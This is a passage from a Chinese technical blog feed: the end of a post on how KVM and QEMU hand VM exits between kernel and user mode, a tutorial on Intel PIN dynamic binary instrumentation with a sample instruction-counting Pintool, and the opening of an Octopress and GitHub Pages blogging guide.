&lt;p&gt;备注：Qemu 线程以 ioctl 的方式向 KVM 内核模块发出指 示,后者执行 VM entry 操作,将处理器由 kernel 模式切换到 Guest 模式,中止宿主机软件, 转而运行客户软件。注意,宿主机软件被中止时,正处于 Qemu 线程上下文,且正在执行 ioctl 系统调用的 kernel 模式处理程序。客户软件在运行过程中,如发生异常或外部中断等事件, 或执行 I/O 操作,可能导致 VM exit,将处理器状态由 Guest 模式切换回 Kernel 模式。KVM 内核模块检查发生 VM exit 的原因,如果 VM exit 由于 I/O 操作导致,则执行系统调用返回操 作,将 I/O 操作交给处于 User 模式的 Qemu 线程来处理,Qemu 线程在处理完 I/O 操作后再 次执行 ioctl,指示 KVM 切换处理器到 Guest 模式,恢复客户软件的运行;如果 VM exit 由于 其它原因导致,则由 KVM 内核模块负责处理,并在处理后切换处理器到 Guest 模式,恢复 客户机的运行。&lt;/p&gt;
&lt;p&gt;完&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;转载本文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2016/01/01/kvm-qemu-bytalk/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/01/01/kvm-qemu-bytalk/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博:&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;KVM/Qemu选择与部署&lt;/li&gt;
&lt;li&gt;KVM/Qemu原理概览&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="virtualization" scheme="http://yoursite.com/categories/virtualization/"/>
    
    
      <category term="Virtualization" scheme="http://yoursite.com/tags/Virtualization/"/>
    
      <category term="KVM" scheme="http://yoursite.com/tags/KVM/"/>
    
      <category term="QEMU" scheme="http://yoursite.com/tags/QEMU/"/>
    
  </entry>
  
  <entry>
    <title>PIN for Dynamic Binary Instrumentation</title>
    <link href="http://yoursite.com/blog/2015/12/18/pin-for-dynamic-binary-instrumentation/"/>
    <id>http://yoursite.com/blog/2015/12/18/pin-for-dynamic-binary-instrumentation/</id>
    <published>2015-12-18T23:39:46.000Z</published>
    <updated>2016-04-21T20:50:26.000Z</updated>
    
    <content type="html">&lt;p&gt;本文旨在让大家大致了解动态二进制代码注入技术：PIN。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;什么是注入（Instrumentation)&lt;/li&gt;
&lt;li&gt;PIN初探&lt;/li&gt;
&lt;li&gt;PIN框架&lt;/li&gt;
&lt;li&gt;Pintools Example&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;什么是注入（Instrumentation&quot;&gt;&lt;a href=&quot;#什么是注入（Instrumentation&quot; class=&quot;headerlink&quot; title=&quot;什么是注入（Instrumentation)&quot;&gt;&lt;/a&gt;什么是注入（Instrumentation)&lt;/h2&gt;&lt;p&gt;每一个写过代码的人都调试过程序，最简单的无非就是手动在源代码中插入printf语句，当然大部分还是会选择一些调试工具如GDB。注入技术也类似，不过注入的对象是可执行二进制文件。简单来说，在你的程序中插入额外的代码来分析程序的运行时信息就称为注入技术。但就广义来说，在源代码中注入代码也可称之为注入，只是为了区分，注入技术一般特指对象为可执行二进制文件。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;进一步说明，注入一般又分为静态二进制注入（Static Binary Instrumentation) 与动态二进制注入 （Dynamic Binary Instrumentation). 看定义可知，SBI技术工作在程序运行前，DBI则工作在运行过程中。相比SBI，DBI技术有以下优势：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不需要重新编译、重新链接&lt;/li&gt;
&lt;li&gt;在运行时发现代码&lt;/li&gt;
&lt;li&gt;能处理动态产生的代码&lt;/li&gt;
&lt;li&gt;能附加到正在运行时的进程中&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;目前，研究较多的都属DBI技术，前文提到，DBI的工作方式有点类似编译器，只不过分析例程（analysis routine)是可编程化的。DBI技术广泛应用在程序分析中，如逆向工程（reverse engineering), 程序调试（program debug)， 恶意代码分析（malware analysis)等。&lt;/p&gt;
&lt;h2 id=&quot;Pin初探&quot;&gt;&lt;a href=&quot;#Pin初探&quot; class=&quot;headerlink&quot; title=&quot;Pin初探&quot;&gt;&lt;/a&gt;Pin初探&lt;/h2&gt;&lt;p&gt;对DBI技术有个大致了解之后，进入本文主题,  Pin是Intel 与University of Colorado合作研究出的一款用来动态分析二进制程序的注入工具，发表在系统顶会PLDI’2005,有兴趣的可以读读这篇文章，其它DBI技术还有Valgrind, DYNAMORIO, QEMU.&lt;/p&gt;
&lt;p&gt;开门见山，首先来看一段代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;    counter++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             sub  $0xff, %edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    counter++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             cmp  %esi, %edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    counter++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             jle &amp;lt;L1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    counter++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             mov  $0x1, %edi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    counter++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             add  $0x10, %eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;```             &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;这段代码很简单，只是在每条指令前加了一个计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;那么如果使用PIN, 该如何实现？ 看下面代码：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;``` C&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#include &amp;quot;pin.h&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;UINT64 icount = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void docount() &amp;#123; icount++; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void Instruction(INS ins, void *v) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void Fini(INT32 code, void *v) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123; std::cerr &amp;lt;&amp;lt; &amp;quot;Count &amp;quot; &amp;lt;&amp;lt; icount &amp;lt;&amp;lt; endl; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int main(int argc, char * argv[])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PIN_Init(argc, argv);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    INS_AddInstrumentFunction(Instruction, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PIN_AddFiniFunction(Fini, 0);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PIN_StartProgram();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;现在对这段实现代码一一解释：&lt;br&gt;&lt;code&gt;void docount() {icount+;}&lt;/code&gt; 用户可自定义&lt;code&gt;docount()&lt;/code&gt; 函数，PIN称之为分析例程 （Analysis routine),先对这个概念保持一点印象。再看void Instruction（）函数，PIN 称之为注入例程（Instrumentation routine), 关注其中两个参数，&lt;code&gt;IPOINT_BEFORE&lt;/code&gt; 表示在每条指令之前执行，&lt;code&gt;（AFUNPTR)docount&lt;/code&gt;便是要注入的分析例程。&lt;code&gt;main()&lt;/code&gt; 函数调用&lt;code&gt;INS_AddInstrumentFunction（Instruction,0)&lt;/code&gt;,便会触发注入例程以及分析例程，这些参数都可以根据自己需求修改。&lt;br&gt;只需这么几行简单的代码，PIN便能帮你分析正在运行的二进制文件执行过的指令条数了。这么简单？ PIN只能做这些吗？ 当然不是！ 下文再介绍一些PIN的框架以及使用过程。&lt;/p&gt;
&lt;h2 id=&quot;PIN框架&quot;&gt;&lt;a href=&quot;#PIN框架&quot; class=&quot;headerlink&quot; title=&quot;PIN框架&quot;&gt;&lt;/a&gt;PIN框架&lt;/h2&gt;&lt;p&gt;可以把PIN理解为实时编译器（just in time complier).只不过输入进PIN的不是二进制代码，而是可执行的二进制文件，PIN能拦截可执行文件的第一条指令，然后从这条指令开始产生新的代码序列，之后将控制权交给产生的代码序列，此刻用户就有机会注入自己的代码，这个过程就是Instrumentation.&lt;br&gt;如果你只想使用PIN来分析自己的二进制代码，内部实现原理 (可阅读PLDI’2005)大可不必关心，关注的应该是PIN为用户提供的上层接口，使用这个接口来编写自己的Pintools. 版权原因，本文也不会深入去介绍PIN是如何实现的。&lt;/p&gt;
&lt;p&gt;下面就来聊聊这个Pintools. Pintools实际上就是用户要实现的Instrumentation过程，可以把Pintools想象成能修改内部PIN的代码产生过程的插件（Plugins),PIN官网会提供一些sample教你怎么写Pintools,大部分还得靠用户自己去写。&lt;br&gt;总的来说，instrumentation包括两个部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一，决定在哪注入代码，注入什么代码的一种机制&lt;/li&gt;
&lt;li&gt;第二，在注入点要执行的代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第一个部分被称之为 &lt;strong&gt;instrumentation routine&lt;/strong&gt;,第二个部分被称之为 &lt;strong&gt;analysis routine&lt;/strong&gt;. Pintools会向PIN注册一个注入回调函数，如上文提到的&lt;code&gt;INS_AddInstrumentFunction（）&lt;/code&gt;，该函数会代表instrumentation routine观察要产生的代码，分析代码的静态属性，来决定是否以及在哪里调用analysis routine. Analysis routine再收集被分析程序的数据。&lt;/p&gt;
&lt;p&gt;注意，前文中的例子对每条指令分析，带来的开销太大，因此，PIN提供不同的粒度对程序进行分析，供用户根据不同需求选择：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Instruction&lt;/li&gt;
&lt;li&gt;Basic block: 包含一些指令序列，终止于控制流改变指令;单入口单出口。&lt;/li&gt;
&lt;li&gt;Trace:包含一些Basic block序列，终止于无条件控制流改变指令；单入口多出口。 &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Pintools-example&quot;&gt;&lt;a href=&quot;#Pintools-example&quot; class=&quot;headerlink&quot; title=&quot;Pintools example&quot;&gt;&lt;/a&gt;Pintools example&lt;/h2&gt;&lt;p&gt;最后，以一个Pintools 的完整例子结束本文&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;C++&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;fstream&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;pin.H&quot;&lt;/span&gt;&lt;/span&gt;

ofstream OutFile;

&lt;span class=&quot;comment&quot;&gt;// The running count of instructions is kept here&lt;/span&gt;
&lt;span class=&quot;comment&quot;&gt;// make it static to help the compiler optimize docount&lt;/span&gt;
&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; UINT64 icount = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;

&lt;span class=&quot;comment&quot;&gt;// This function is called before every instruction is      executed&lt;/span&gt;
&lt;span class=&quot;function&quot;&gt;VOID &lt;span class=&quot;title&quot;&gt;docount&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{ icount++; }

&lt;span class=&quot;comment&quot;&gt;// Pin calls this function every time a new instruction     is encountered&lt;/span&gt;
&lt;span class=&quot;function&quot;&gt;VOID &lt;span class=&quot;title&quot;&gt;Instruction&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(INS ins, VOID *v)&lt;/span&gt;
&lt;/span&gt;{
    &lt;span class=&quot;comment&quot;&gt;// Insert a call to docount before every            instruction, no arguments are passed&lt;/span&gt;
  INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);
}

KNOB&amp;lt;&lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt;&amp;gt; KnobOutputFile(KNOB_MODE_WRITEONCE, &lt;span class=&quot;string&quot;&gt;&quot;pintool&quot;&lt;/span&gt;,
&lt;span class=&quot;string&quot;&gt;&quot;o&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;inscount.out&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;specify output file name&quot;&lt;/span&gt;);

&lt;span class=&quot;comment&quot;&gt;// This function is called when the application exits&lt;/span&gt;
&lt;span class=&quot;function&quot;&gt;VOID &lt;span class=&quot;title&quot;&gt;Fini&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(INT32 code, VOID *v)&lt;/span&gt;
&lt;/span&gt;{
    &lt;span class=&quot;comment&quot;&gt;// Write to a file since cout and cerr maybe closed     by the application&lt;/span&gt;
  OutFile.setf(ios::showbase);
  OutFile &amp;lt;&amp;lt; &lt;span class=&quot;string&quot;&gt;&quot;Count &quot;&lt;/span&gt; &amp;lt;&amp;lt; icount &amp;lt;&amp;lt; &lt;span class=&quot;built_in&quot;&gt;endl&lt;/span&gt;;
  OutFile.close();
}

&lt;span class=&quot;comment&quot;&gt;/* =====================================================     ================ */&lt;/span&gt;
&lt;span class=&quot;comment&quot;&gt;/* Print Help Message                                                        */&lt;/span&gt;
&lt;span class=&quot;comment&quot;&gt;/* =====================================================     ================ */&lt;/span&gt;

&lt;span class=&quot;function&quot;&gt;INT32 &lt;span class=&quot;title&quot;&gt;Usage&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;
&lt;/span&gt;{
   &lt;span class=&quot;built_in&quot;&gt;cerr&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&quot;string&quot;&gt;&quot;This tool counts the number of dynamic          instructions executed&quot;&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&quot;built_in&quot;&gt;endl&lt;/span&gt;;
   &lt;span class=&quot;built_in&quot;&gt;cerr&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&quot;built_in&quot;&gt;endl&lt;/span&gt; &amp;lt;&amp;lt; KNOB_BASE::StringKnobSummary() &amp;lt;&amp;lt;      &lt;span class=&quot;built_in&quot;&gt;endl&lt;/span&gt;;
    return &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;
}

&lt;span class=&quot;comment&quot;&gt;/* =====================================================     ================ */&lt;/span&gt;
&lt;span class=&quot;comment&quot;&gt;/* Main                                                                      */&lt;/span&gt;
&lt;span class=&quot;comment&quot;&gt;/* =====================================================     ================ */&lt;/span&gt;
&lt;span class=&quot;comment&quot;&gt;/*   argc, argv are the entire command line: pin -t      &amp;lt;toolname&amp;gt; -- ...    */&lt;/span&gt;
&lt;span class=&quot;comment&quot;&gt;/* =====================================================     ================ */&lt;/span&gt;

&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; * argv[])&lt;/span&gt;
&lt;/span&gt;{
   &lt;span class=&quot;comment&quot;&gt;// Initialize pin&lt;/span&gt;
   &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (PIN_Init(argc, argv)) return Usage();

   OutFile.open(KnobOutputFile.Value().c_str());

  &lt;span class=&quot;comment&quot;&gt;// Register Instruction to be called to instrument      instructions&lt;/span&gt;
    INS_AddInstrumentFunction(Instruction, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);

   &lt;span class=&quot;comment&quot;&gt;// Register Fini to be called when the application      exits&lt;/span&gt;
    PIN_AddFiniFunction(Fini, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);

    &lt;span class=&quot;comment&quot;&gt;// Start the program, never returns&lt;/span&gt;
    PIN_StartProgram();

    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.cs.virginia.edu/kim/docs/pldi05.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PLDI’2005&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://software.intel.com/sites/landingpage/pintool/docs/65163/Pin/html/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PIN User Manual&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PIN Intel Tutorials&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If you are interested in concurrent programming, please donot hesitate to touch &lt;a href=&quot;http://yebangyu.org&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;my friend’s blog&lt;/a&gt; &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;转载此文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2015/12/18/pin-for-dynamic-binary-instrumentation/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2015/12/18/pin-for-dynamic-binary-instrumentation/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者 [新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文旨在让大家大致了解动态二进制代码注入技术：PIN。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;什么是注入（Instrumentation)&lt;/li&gt;
&lt;li&gt;PIN初探&lt;/li&gt;
&lt;li&gt;PIN框架&lt;/li&gt;
&lt;li&gt;Pintools Example&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;什么是注入（Instrumentation&quot;&gt;&lt;a href=&quot;#什么是注入（Instrumentation&quot; class=&quot;headerlink&quot; title=&quot;什么是注入（Instrumentation)&quot;&gt;&lt;/a&gt;什么是注入（Instrumentation)&lt;/h2&gt;&lt;p&gt;每一个写过代码的人都调试过程序，最简单的无非就是手动在源代码中插入printf语句，当然大部分还是会选择一些调试工具如GDB。注入技术也类似，不过注入的对象是可执行二进制文件。简单来说，在你的程序中插入额外的代码来分析程序的运行时信息就称为注入技术。但就广义来说，在源代码中注入代码也可称之为注入，只是为了区分，注入技术一般特指对象为可执行二进制文件。&lt;/p&gt;
    
    </summary>
    
      <category term="BinaryCode" scheme="http://yoursite.com/categories/BinaryCode/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Binary" scheme="http://yoursite.com/tags/Binary/"/>
    
      <category term="Instrumentation" scheme="http://yoursite.com/tags/Instrumentation/"/>
    
  </entry>
  
  <entry>
    <title>像黑客一样写博客: Octopress + Github Pages</title>
    <link href="http://yoursite.com/blog/2015/12/16/octopress-tutorial/"/>
    <id>http://yoursite.com/blog/2015/12/16/octopress-tutorial/</id>
    <published>2015-12-17T00:45:50.000Z</published>
    <updated>2016-04-21T20:49:18.000Z</updated>
    
    <content type="html">&lt;p&gt;本文是笔者加入Octopress blog之后发布的第一篇文章，主要讲解如何利用Octopress与Github Pages搭建一个黑客似的博客站点。目的有二，其一为了熟悉Octopress语法与发布过程，其二也想为新手们提供一点点帮助与建议。笔者会尽可能的讲解怎么做，为什么这么做，让大家尽快加入Hackers Blog阵营，记录自己的技术、生活与感悟，and anything you want.&lt;br&gt;如有不对的地方，还请批评指正。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;为什么选择Octopress + Github Pages&lt;/li&gt;
&lt;li&gt;了解Github Pages 与 Git&lt;/li&gt;
&lt;li&gt;了解Markdown&lt;/li&gt;
&lt;li&gt;新手上路&lt;/li&gt;
&lt;li&gt;安装Octopress&lt;/li&gt;
&lt;li&gt;部署Github Pages&lt;/li&gt;
&lt;li&gt;私人定制个性域名&lt;/li&gt;
&lt;li&gt;发布第一篇Hackers Blog&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;为什么选择Octopress&quot;&gt;&lt;a href=&quot;#为什么选择Octopress&quot; class=&quot;headerlink&quot; title=&quot;为什么选择Octopress&quot;&gt;&lt;/a&gt;为什么选择Octopress&lt;/h2&gt;&lt;p&gt;要搭建个人博客，大家耳熟能详的可能会是Wordpress，Wordpress有丰富的主题，以及其所见即所得的简单操作，稍微熟悉一点的人两个小时之内就能做成一个非常漂亮的博客，对于非工科人士来说简直太兴奋了，如同在某些博客网站上如CSDN, CNBLOGS等发布博客一样简单省事。Wordpress提倡简单便捷，用户不必关心内部实现细节。 就笔者看来，Wordpress 与 Octopress 有点像Office Word与Latex的区别，office写文章大家再熟悉不过了，但要想排版私人定制化，Latex更胜一筹，相信那些混迹于各种paper各种公式的工科男没人不会Latex。 Octopress也类似，可控性非常强，熟悉一些简单的标记语言Markdown(下文会简单介绍）以及简单的Ruby语法，就能让你的个人博客无所不能。选择Octopress,原因有三：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;其一，Octopress免费开源，将Octopress搭建的博客绑定到Github Pages 上，就不用再操心买哪种服务器了，还可以省下一笔服务器的费用&lt;/li&gt;
&lt;li&gt;其二，A blogging framework for hackers,          这正是Octopress 官网所提倡的&amp;lt;专为黑客定制的博客框架&amp;gt;,听起来是不是有点技术含量，既能写好自己的博客，还能学习新知识，一举多得&lt;/li&gt;
&lt;li&gt;其三，octopress可控性非常强，纯代码生成，妈妈再也不用担心你写博客了&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&quot;了解Github-Pages-与-Git&quot;&gt;&lt;a href=&quot;#了解Github-Pages-与-Git&quot; class=&quot;headerlink&quot; title=&quot;了解Github Pages 与 Git&quot;&gt;&lt;/a&gt;了解Github Pages 与 Git&lt;/h2&gt;&lt;p&gt;Github Pages是依托Github本身的技术体验开发出来的一款产品，这对IT人员来说必然是一个福音，对于一些不愿分享代码的hacker来说，在Github Pages上写写博客也许更适合它。要使用Github Pages,首先你得有一个github账号，如果还没有的就赶紧申请吧。&lt;/p&gt;
&lt;p&gt;有了github账号之后，只需要在创建一个仓库，&lt;code&gt;create new repository&lt;/code&gt;，这个时候要注意，创建的新仓库的名字格式必须是&lt;code&gt;username.github.io&lt;/code&gt;, 这里的&lt;em&gt;username&lt;/em&gt; 便是你在github上的用户名，如此一来，github便会自动识别出这是一个用来创建Github Pages的仓库，之后用Octopress上传到这个仓库里面的源代码以及其它文档便是创建博客需要的所有文件，至于Octopress怎么绑定到github pages后文会继续讲解。&lt;/p&gt;
&lt;p&gt;这里在&lt;code&gt;create new repository&lt;/code&gt;的时候可能会遇到一个问题，就是创建的过程中，会提示你创建了仓库之后需不需要同时创建一个&lt;em&gt;readme&lt;/em&gt; 文件，那么问题来了，这时如果你勾选了创建&lt;em&gt;readme&lt;/em&gt; 文件，之后用Octopress给仓库上传文件的时候可能会遇到远程仓库与本地文件冲突问题，类似&lt;/p&gt;
